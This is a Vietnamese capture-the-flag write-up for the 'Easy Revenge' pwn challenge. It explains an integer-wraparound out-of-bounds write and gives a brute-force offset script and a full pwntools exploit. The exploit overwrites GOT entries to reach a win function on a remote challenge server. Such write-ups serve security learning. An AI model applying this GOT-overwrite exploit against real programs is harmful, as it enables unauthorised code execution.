# Easy Revenge---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài Easy Revenge của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 17/12/2025

## 1. Mục tiêu cần làm
Bài này là biến thể cấp cao của bài **Easyyyyyyyyyyyyyyyy** mà mình đã giải. Nó cũng xài **OOB** nhưng hãy đọc code ở đoạn này

```C
__int64 input_player()
{
  __int64 v1[2]; // [rsp+0h] [rbp-10h] BYREF

  v1[1] = __readfsqword(0x28u);
  printf("Input user 's id:");
  if ( (unsigned int)__isoc99_scanf("%llu", v1) != 1 )
    return -1LL;
  if ( v1[0] <= 0x333333333333332uLL )
  {
    printf("Input user 's name:");
    read(0, &users[80 * v1[0]], 80uLL);
    return v1[0];
  }
  else
  {
    printf("Error: ID %llu is too large or invalid.\n", v1[0]);
    return -1LL;
  }
}
```

Nếu ta nhập index là âm như bài trước thì nó sẽ thực hiện **Bù 2** và sẽ tạo ra 1 con số rất lớn. Lấy ví dụ mình nhập -2 thì nó sẽ chuyển đổi giá trị này sang dạng nhị phân 64-bit : `0xFFFFFFFFFFFFFFFE` đổi sang thập phân là 18,446,744,073,709,551,614 ( Max 64bit - 1 ). Số này lớn hơn với điều kiện if rất nhiều nên ta phải tìm con số sao cho bé hơn số này. Khi tìm được ta làm y chang bài cũ là xong.

## 2. Cách thực thi
Đầu tiên là tìm xem địa chỉ `users` ở đâu và khoảng cách đến các `@got` là bao nhiêu để tính.

```Python
user_add = e.symbols['users']
log.success(f'User address : {hex(user_add)}')
```

Sau đó hãy mở gdb và gõ Start, sau đó gõ got để tìm địa chỉ `printf@got`

<img width="1164" height="400" alt="image" src="https://github.com/user-attachments/assets/c52e44d2-f6d3-45e3-b70d-545a3bb978fe" />

Ta sẽ lấy địa chỉ `users` trừ cho địa chỉ `printf@got` là ra 160 byte. Giờ chúng ta cần tìm 1 số sao cho số đó phải bé hơn hoặc bằng `0x333333333333332uLL` và khi nhân cho 80 nó sẽ ra âm để ta quay ngược lại trỏ vào `printf@got`. Mình đã code ra brute force để tìm offset bé nhất có thể xài được.

```Python
def find_id_scanner(start_offset):
    LIMIT = 0x333333333333332
    MODULUS = 1 << 64
    
    current_offset = start_offset
    
    # Đảm bảo bắt đầu từ số chia hết cho 16
    if current_offset % 16 != 0:
        current_offset += (16 - (current_offset % 16))

    print(f"[*] Bắt đầu quét từ Offset -{current_offset} trở đi...\n")
    print(f"{'OFFSET (Negative)':<20} | {'DECIMAL ID':<25} | {'HEX ID'}")
    print("-" * 65)

    while True:
        found_for_this_offset = False
        
        # Tìm k (số vòng lặp wrap-around)
        for k in range(1, 21):
            numerator = (k * MODULUS) - current_offset
            
            if numerator % 80 == 0:
                candidate_id = numerator // 80
                
                if candidate_id <= LIMIT:
                    print(f"-{current_offset:<19} | {candidate_id:<25} | {hex(candidate_id)}")
                    found_for_this_offset = True
                    break 
        
        # Bước nhảy là 16 (điều kiện toán học bắt buộc)
        current_offset += 16
        
        # Dừng lại ở một giới hạn nào đó để không chạy vô tận (ví dụ: quét tới 500 bytes)
        # Bạn có thể tăng số này lên nếu target nằm xa hơn
        if current_offset > 500:
            break

# Chạy hàm bắt đầu từ 160
find_id_scanner(160)
```

Ta sẽ lấy số bé nhất

<img width="834" height="168" alt="image" src="https://github.com/user-attachments/assets/cbef43d9-81e9-4fc3-a70e-85b655d3741d" />

Giờ mục tiêu ta là đè vào -160 nhưng offset tận -176, giờ xem từ -176 đến -160 chúng ta sẽ đè các hàm `got` nào. Hãy gõ `x/xg 0x4036a0 - 176`.

<img width="661" height="50" alt="image" src="https://github.com/user-attachments/assets/62cee031-e76e-41fd-b5be-83fd37b8f201" />

Vậy là bắt đầu đè từ `setbuf@got` đến `printf@got`. Trong đây có cả `system@got`, chúng ta không nên đè nó bằng 1 địa chỉ hay `A` mà phải đè nó bằng chính nó. Ta sẽ có payload như sau.

```Python
win_addr = e.symbols['win']
system_plt = e.plt['system']
system_got = e.got['system']
setbuf_plt = e.plt['setbuf']

restore_system_val = u64(e.read(system_got, 8))

payload = p64(setbuf_plt) + p64(restore_system_val) + p64(win_addr + 1)
```

`restore_system_val = u64(e.read(system_got, 8))` có nghĩa là khi chạy chương trình, biến này sẽ lấy 8 byte trực tiếp từ file binary. Nghĩa là đây là lệnh thực thi `system@plt` nguyên zin chưa mất trinh.

Còn tại sao `win_addr + 1` là để xử lí lỗi **Stack Alignment**.

Vậy là xong bài này khó hơn bài kia 1 tí là do chúng ta không thể nhập số âm được mà phải tìm 1 số cực lớn để chạy. Cho mình 1 star để có động lực viết tiếp nha 🐧.

## 3. Exploit
```Python
from pwn import *

e = ELF('./test')

# p = process('./test')
p = remote('67.223.119.69', 5028)

user_add = e.symbols['users']
win_addr = e.symbols['win']
system_plt = e.plt['system']
system_got = e.got['system']
setbuf_plt = e.plt['setbuf']

log.success(f'User address : {hex(user_add)}')

restore_system_val = u64(e.read(system_got, 8))

magic_id = "230584300921369393"

p.recvuntil(b"First, create a user.")
p.sendline(b"Dummy")

p.recvuntil(b"Input your choice:")
p.sendline(b"1")

p.recvuntil(b"Input user 's id:")
p.sendline(magic_id.encode())

payload = p64(setbuf_plt) + p64(restore_system_val) + p64(win_addr + 1)

p.recvuntil(b"Input user 's name:")
p.send(payload)

p.interactive()
```




